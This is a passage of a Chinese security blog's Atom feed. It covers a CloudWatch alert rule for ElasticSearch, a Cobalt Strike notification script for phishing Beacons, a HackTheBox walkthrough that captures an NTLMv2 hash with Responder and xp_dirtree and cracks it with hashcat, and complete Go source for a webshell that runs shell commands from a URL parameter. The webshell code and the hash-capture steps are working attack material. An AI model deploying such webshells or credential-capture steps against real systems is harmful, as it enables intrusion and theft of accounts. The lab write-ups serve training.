rel="noopener">https://www.exploit-db.com/exploits/46984</a><br>[8] HackTheBox: Postman - Writeup, <a href="https://www.soeren.codes/2019/12/24/postbox-writeup/" target="_blank" rel="noopener">https://www.soeren.codes/2019/12/24/postbox-writeup/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;懒了，原本要保证每个月至少输出一篇blog，翻了翻做的笔记，不是不能拿出来讲的就是片段化的知识点，要
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用 CloudWatch Event 监控 ElasticSearch 事件</title>
    <link href="https://tonghuaroot.com/2020/05/22/Use-CloudWatch-Event-to-monitor-ElasticSearch-events/"/>
    <id>https://tonghuaroot.com/2020/05/22/Use-CloudWatch-Event-to-monitor-ElasticSearch-events/</id>
    <published>2020-05-21T21:42:28.000Z</published>
    <updated>2020-05-27T08:07:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>为了监控 ElasticSearch Cluster 被非预期删除、创建等情况，需要搞一个监控，当监控到这种行为时，会触发 SNS 告警。<br>有如下几个思路：</p><ol><li>写个脚本定期监控 CloudTrail 有非预期API CALL的时候触发SNS</li><li>将 CloudTrail 中的日志写到 CloudWatch log group 中，然后再自定义 metric 配合 alarm 实现告警</li><li>利用 CloudWatch Event 监听 elasticsearch 事件实现告警</li></ol><h2 id="0x01-思路解读"><a href="#0x01-思路解读" class="headerlink" title="0x01 思路解读"></a>0x01 思路解读</h2><p>第一种方法就是将 CloudTrail logs 打到 S3 然后在分析 S3 中存储的 api call 情况，这种需要人工介入的地方还挺多的，不咋优雅，还有优先采用 AWS 自身提供的服务做到这件事，故跳过了。<br>第二种方法可以参考文档[1]，直接梭哈。<br>第三种就有意思了，官方文档中没有给出现成的demo[2]，需要我们自定义，这里就来聊一聊自定义的思路。</p><h2 id="0x02-利用-CloudWatch-Event-监听-elasticsearch-事件实现告警"><a href="#0x02-利用-CloudWatch-Event-监听-elasticsearch-事件实现告警" class="headerlink" title="0x02 利用 CloudWatch Event 监听 elasticsearch 事件实现告警"></a>0x02 利用 CloudWatch Event 监听 elasticsearch 事件实现告警</h2><p>在 CloudWatch Event 的 console 中 service name 并没有ES相关的服务。</p><p><img src="01.png" alt="1"></p><p>在文档[1]中有提及“Creating a CloudWatch Events Rule That Triggers on an AWS API Call Using AWS CloudTrail”，也就是说理论上cloudtrail中记录的log在这里都能实现监控和告警。研究了一下，Event Pattern 内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;source&quot;: [</span><br><span class="line">    &quot;aws.es&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;detail-type&quot;: [</span><br><span class="line">    &quot;AWS API Call via CloudTrail&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;detail&quot;: &#123;</span><br><span class="line">    &quot;eventSource&quot;: [</span><br><span class="line">      &quot;es.amazonaws.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;eventName&quot;: [</span><br><span class="line">      &quot;DeleteElasticsearchDomain&quot;,</span><br><span class="line">      &quot;CreateElasticsearchDomain&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路就是找一个其他服务的 Event Pattern 然后尝试替换为 ES 的 source、eventSource、eventName。<br>效果如下：</p><p><img src="02.png" alt="2"></p><p>不过现在要自己写，没准过段时间，这个功能就加上了呢。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><ul><li>[1] Creating CloudWatch Alarms for CloudTrail Events: Examples, <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail.html</a></li><li>[2] Creating a CloudWatch Events Rule That Triggers on an AWS API Call Using AWS CloudTrail, <a href="https://docs.amazonaws.cn/en_us/AmazonCloudWatch/latest/events/Create-CloudWatch-Events-CloudTrail-Rule.html" target="_blank" rel="noopener">https://docs.amazonaws.cn/en_us/AmazonCloudWatch/latest/events/Create-CloudWatch-Events-CloudTrail-Rule.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;为了监控 ElasticSearch Cluster 被非预期删除、创建等情况，需要搞一个监控，当监
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Aggressor Script 实现 Beacon 上线告警功能</title>
    <link href="https://tonghuaroot.com/2020/04/25/Cobalt-Strike-Aggressor-Script-IM-Alert/"/>
    <id>https://tonghuaroot.com/2020/04/25/Cobalt-Strike-Aggressor-Script-IM-Alert/</id>
    <published>2020-04-25T00:36:41.000Z</published>
    <updated>2020-04-25T08:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>把之前写的一个笔记翻出来，思路比较简单，所以也就不额外的添加内容直接发出来了。</p><p>最近在研究CobaltStrike，有一个使用场景是说，当我把钓鱼邮件发出去了，等着Beacon上线的这段时间是无感知的，也就是说什么时候上线不知道、上没上线也不知道。传统的解决方案是说抽空上来瞅一眼，长远来讲这种方法是低效且不可靠的（emm，看日志可以知道shell来过又掉了hhh）。<br>而我个人做事的态度是比较推崇流程化、工具化、自动化和文档化的，所以便想着可以配合一些IM实现Beacon上线以及System Profiler触发的实时告警，方便RedTeamer及时响应做后续的操作。</p><h2 id="0x01-告警项"><a href="#0x01-告警项" class="headerlink" title="0x01 告警项"></a>0x01 告警项</h2><ul><li>Beacon</li><li>System Profiler</li><li>Clone Site</li><li>etc…</li></ul><h2 id="0x02-需要适配的IM"><a href="#0x02-需要适配的IM" class="headerlink" title="0x02 需要适配的IM"></a>0x02 需要适配的IM</h2><ul><li>钉钉</li><li>微信</li><li>企业微信</li><li>Slack</li><li>Telegram</li><li>Chime</li><li>Mail</li><li>自定义函数（方便后续其他IM适配）</li></ul><h2 id="0x03-实现思路"><a href="#0x03-实现思路" class="headerlink" title="0x03 实现思路"></a>0x03 实现思路</h2><p>代码量不多，整体的思路是，当事件触发时调用 HTTP POST/GET 请求，callback对应的IM应用接收消息，工作量主要集中在各类 IM webhook 的接口申请上，或者未开放接口的，要找一些第三方的开源解决方案，效果图如下：</p><p><img src="01.png" alt="01"></p><p><img src="02.png" alt="02"></p><p>参考文档：<a href="https://www.cobaltstrike.com/aggressor-script/events.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/events.html</a> ，获取 Cobalt Strike 的 event list。</p><p>结合 Headless Cobalt Strike 可以应用到将 cna 脚本的功能同步至连接同一 teamserver 的全部 Cobalt Strike Client，参考：<a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/index.html</a></p><p>这么做有一个好处，避免 Cobalt Strike Client 所处的网络不稳导致无法实时感知 Beacon 上线行为，协同作战的时候也比较方便。</p><p>代码放在 Github 上了：<a href="https://github.com/omg2hei/CobaltStrikeAggressor/blob/master/CSNotification.cna" target="_blank" rel="noopener">https://github.com/omg2hei/CobaltStrikeAggressor/blob/master/CSNotification.cna</a></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>Aggressor 脚本写起来并不难，主要还是安全思路的价值大于软件工程，最近在整理一些基础功能的cna代码，以期当有更好的安全思路时可以快速构建PoC，验证思路的价值。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li>[1] 利用钉钉机器人发送告警信息, <a href="https://www.jianshu.com/p/52b5861ded59" target="_blank" rel="noopener">https://www.jianshu.com/p/52b5861ded59</a></li><li>[2] Slack Notifications for Cobalt Strike, <a href="https://threatexpress.com/blogs/2016/slack-notifications-for-cobalt-strike/#slack-notifications-for-cobalt-strike" target="_blank" rel="noopener">https://threatexpress.com/blogs/2016/slack-notifications-for-cobalt-strike/#slack-notifications-for-cobalt-strike</a></li><li>[3] <a href="https://github.com/dcsync/pycobalt/blob/master/docs/aggressor.md" target="_blank" rel="noopener">https://github.com/dcsync/pycobalt/blob/master/docs/aggressor.md</a></li><li>[4] 自动化工具 钉钉机器人消息 Python 封装 (开源), <a href="https://testerhome.com/topics/11758" target="_blank" rel="noopener">https://testerhome.com/topics/11758</a></li><li>[5] Cobalt Strike神器高级教程利用Aggressor脚本编写目标上线邮件提醒, <a href="https://blog.csdn.net/qq_27446553/article/details/79380021" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79380021</a></li><li>[6] aggressor_scripts/http.cna, <a href="https://github.com/001SPARTaN/aggressor_scripts/blob/master/http.cna" target="_blank" rel="noopener">https://github.com/001SPARTaN/aggressor_scripts/blob/master/http.cna</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;把之前写的一个笔记翻出来，思路比较简单，所以也就不额外的添加内容直接发出来了。&lt;/p&gt;
&lt;p&gt;最近在
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HashCat：如何利用HashCat破解NTLMv2 hash？</title>
    <link href="https://tonghuaroot.com/2020/03/02/how-to-use-hashcat-to-crack-ntlmv2-hash/"/>
    <id>https://tonghuaroot.com/2020/03/02/how-to-use-hashcat-to-crack-ntlmv2-hash/</id>
    <published>2020-03-02T07:29:12.000Z</published>
    <updated>2020-03-02T15:43:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当我们利用Responder拿到目标机做SMB文件共享时使用的NetNTLMv2 hash后，可以利用HashCat对该hash进行破解，还原出明文密码。</p><p>在这篇文章中，我会介绍一下，如何利用Responder监听拿到目标机的NetNTLMv2 hash。以及如何使用HashCat破解hash还原密码。</p><h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><p>攻击机（Kali Linux）：10.10.14.7</p><p>靶机（Microsoft Windows Server 2019 Standard）：10.10.10.125</p><p>我们现在以及拿到了一个低权限的MSSQL账号密码，然后想要利用Responder进一步拿到NetNTLMv2 hash。</p><p>当然拿到NetNTLMv2 hash的方法还有很多，比如说我18年在朋友圈提到的Word doc UNC注入拿NetNTLMv2 hash。</p><p><img src="1.png" alt="1"></p><h2 id="0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？"><a href="#0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？" class="headerlink" title="0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？"></a>0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？</h2><p>第1步：启动Responder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>第2步：利用SMB文件共享，访问攻击机的目录，请求就会打在Responder上了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &quot;\\10.10.14.7\tonghuaroot.com&quot;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>第3步：检查Responder记录</p><p>可以看到我们已经成功拿到了NTLMv2 hash。</p><p><img src="4.png" alt="4"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql-svc::QUERIER:3dedaec57679f94c:D07E7F388AC9FBCC407509FCF0745E13:0101000000000000C0653150DE09D20174F5F4C3BF1B0BDA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000006E68D653C9F1101BDD416587149E0A62257D13DFDAE23D53CEF44E8FB43B04120A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="0x03-如何利用HashCat破解NetNTLMv2-Hash？"><a href="#0x03-如何利用HashCat破解NetNTLMv2-Hash？" class="headerlink" title="0x03 如何利用HashCat破解NetNTLMv2 Hash？"></a>0x03 如何利用HashCat破解NetNTLMv2 Hash？</h2><p>其实很简单，HashCat在破解密码的时候分为不同的Mode，对应不同的加密方式。</p><p>第1步：确认应该采用哪种Mode进行破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --example-hashes | less</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>MODE: 5600</p><p>第2步：加载字典破解NetNTLMv2 hash</p><p>（注：这里只是演示使用思路，具体实际环境使用GPU破解、搭建密码破解集群等内容将会在后面的内容为大家介绍。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hashes/Querier.ntlmv2 /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="6"></p><p>域：QUERIER</p><p>用户名：MSSQL-SVC</p><p>密码：corporate568</p><p>使用上面HashCat跑出来的凭证我们就可以继续后续的利用了，当然这部分并不是本文讨论的重点。</p><p><img src="7.png" alt="7"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>在这篇文章种主要记录了一下使用使用HashCat破解NetNTLMv2 Hash。</p><p>如果您对我的文章感兴趣，并且再复现的时候遇到了困难，请随时PM我，我非常愿意花时间和您讨论。</p><p>PS：渗透这东西主要还是积累、经验和思路，再就是要多动手，HTB这个平台我吹到爆，实验环境多的很，真的是舒服。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[1] Querier, <a href="https://www.hackthebox.eu/home/machines/profile/175" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/175</a></p><p>[2] HackTheBox - Querier, <a href="https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1" target="_blank" rel="noopener">https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;当我们利用Responder拿到目标机做SMB文件共享时使用的NetNTLMv2 hash后，可以利
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我也来喷一喷零信任</title>
    <link href="https://tonghuaroot.com/2020/02/28/Zero-trust-in-my-eyes/"/>
    <id>https://tonghuaroot.com/2020/02/28/Zero-trust-in-my-eyes/</id>
    <published>2020-02-27T23:18:58.000Z</published>
    <updated>2020-02-28T07:29:45.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>2019年12月26日 11:29</li></ul><p>零信任安全架构的核心就是 Never Trust， Always Verify。</p><p>说白了就是针对身份实体的请求上下文做一个综合判断，最后给出allow或者deny的结论，可玩的点还是在于鉴权的proxy怎么实现，规则怎么写，怎么对接后端服务，如何配合专业研发的能力，做好system design实现高并发、高可用（毕竟原本可以直接打到后段服务的请求，现在要走一层鉴权的proxy）。</p><p>为啥中文资料说的一个比一个玄乎，你跟所谓“安全专家”请教零信任的时候，他就跟你玄学科普，只谈宏观安全建设，不谈技术细节，你拿着Google BeyondCorp的paper再跟他讨论如何落地的时候，他又避而不谈跟你扯到ATT&amp;CK了，我…港真，直接撸BeyondCorp那篇paper，再结合公有云厂商的IAM实现来看比那些蹭流量的辣鸡水文靠谱的多。</p><p>另外，我酸了，有的时候闷头搞东西出不来成果的时候，真的很羡慕这些靠吹牛逼赚钱的“安全专家”。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;2019年12月26日 11:29&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;零信任安全架构的核心就是 Never Trust， Always Verify。&lt;/p&gt;
&lt;p&gt;说白了就是针对身份实体的请求上下文做一个综合判断，最后给出allow或者deny的结论，可玩的点还是在
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何实现一个基于 Golang 的  webshell？</title>
    <link href="https://tonghuaroot.com/2020/01/01/Golang-webshell/"/>
    <id>https://tonghuaroot.com/2020/01/01/Golang-webshell/</id>
    <published>2020-01-01T06:42:39.000Z</published>
    <updated>2020-01-01T14:52:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我将记录一下如何使用Golang实现一个webshell。</p><h2 id="0x01-HTTP"><a href="#0x01-HTTP" class="headerlink" title="0x01 HTTP"></a>0x01 HTTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTP requests.&quot;)</span><br><span class="line">   err := http.ListenAndServe(os.Args[1], nil)</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/webshell$ go install webshell</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:05:55 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:05:55 Error creating server. listen tcp 0.0.0.0:80: bind: permission denied</span><br><span class="line">ec2-user@kali:~/go/src/webshell$ sudo ~/go/bin/webshell 0.0.0.0:80</span><br><span class="line">2020/01/01 14:06:00 Listening for HTTP requests.</span><br><span class="line">2020/01/01 14:06:04 Request from 54.222.196.177:61772: ifconfig</span><br><span class="line">^C</span><br><span class="line">ec2-user@kali:~/go/src/webshell$</span><br></pre></td></tr></table></figure></p><p><img src="2.png" alt="image"></p><h2 id="0x02-HTTPS"><a href="#0x02-HTTPS" class="headerlink" title="0x02 HTTPS"></a>0x02 HTTPS</h2><p>注意把证书和私钥配上就可以走HTTPS了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">   &quot;fmt&quot;</span><br><span class="line">   &quot;log&quot;</span><br><span class="line">   &quot;net/http&quot;</span><br><span class="line">   &quot;os&quot;</span><br><span class="line">   &quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var shell = &quot;/bin/sh&quot;</span><br><span class="line">var shellArg = &quot;-c&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">   if len(os.Args) != 2 &#123;</span><br><span class="line">      fmt.Printf(&quot;Usage: %s &lt;listenAddress&gt;\n&quot;, os.Args[0])</span><br><span class="line">      fmt.Printf(&quot;Example: %s localhost:8080\n&quot;, os.Args[0])</span><br><span class="line">      os.Exit(1)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   http.HandleFunc(&quot;/&quot;, requestHandler)</span><br><span class="line">   log.Println(&quot;Listening for HTTPS requests.&quot;)</span><br><span class="line">   err := http.ListenAndServeTLS( </span><br><span class="line">      &quot;os.Args[1]&quot;, </span><br><span class="line">      &quot;cert.pem&quot;, </span><br><span class="line">      &quot;privateKey.pem&quot;, </span><br><span class="line">      nil, </span><br><span class="line">   )</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      log.Fatal(&quot;Error creating server. &quot;, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func requestHandler(writer http.ResponseWriter, request *http.Request) &#123;</span><br><span class="line">   // Get command to execute from GET query parameters</span><br><span class="line">   cmd := request.URL.Query().Get(&quot;cmd&quot;)</span><br><span class="line">   if cmd == &quot;&quot; &#123;</span><br><span class="line">      fmt.Fprintln(</span><br><span class="line">         writer,</span><br><span class="line">         &quot;No command provided. Example: /?cmd=whoami&quot;)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.Printf(&quot;Request from %s: %s\n&quot;, request.RemoteAddr, cmd)</span><br><span class="line">   fmt.Fprintf(writer, &quot;You requested command: %s\n&quot;, cmd)</span><br><span class="line"></span><br><span class="line">   // Run the command</span><br><span class="line">   command := exec.Command(shell, shellArg, cmd)</span><br><span class="line">   output, err := command.Output()</span><br><span class="line">   if err != nil &#123;</span><br><span class="line">      fmt.Fprintf(writer, &quot;Error with command.\n%s\n&quot;, err.Error())</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Write output of command to the response writer interface</span><br><span class="line">   fmt.Fprintf(writer, &quot;Output: \n%s\n&quot;, output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="3.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ec2-user@kali:~/go/src/httpswebshell$ curl 127.0.0.1:443/?cmd=id</span><br><span class="line">You requested command: id</span><br><span class="line">Output:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><p><img src="4.png" alt="image"></p><h2 id="0x03-使用方法（交叉编译）"><a href="#0x03-使用方法（交叉编译）" class="headerlink" title="0x03 使用方法（交叉编译）"></a>0x03 使用方法（交叉编译）</h2><p>需要针对目标主机的类型，将其编译为对应的可执行文件。<br>本地测试命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo go run ~/go/src/httpswebshell/webshell.go 0.0.0.0:443</span><br><span class="line">go install httpswebshell # 编译</span><br></pre></td></tr></table></figure></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>记录一下使用Golang实现webshell，走HTTP(S)。</p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p>[1] Security with Go</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在这篇文章中，我将记录一下如何使用Golang实现一个webshell。&lt;/p&gt;
&lt;h2 id=&quot;0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何配置Policy强制AWS控制台使用MFA，CLI不用MFA？</title>
    <link href="https://tonghuaroot.com/2019/11/25/AWS-IAM-MFA-force-console-no-use-MFA-in-CLI/"/>
    <id>https://tonghuaroot.com/2019/11/25/AWS-IAM-MFA-force-console-no-use-MFA-in-CLI/</id>
    <published>2019-11-25T00:42:17.000Z</published>
    <updated>2019-11-25T08:50:22.000Z</updated>
    
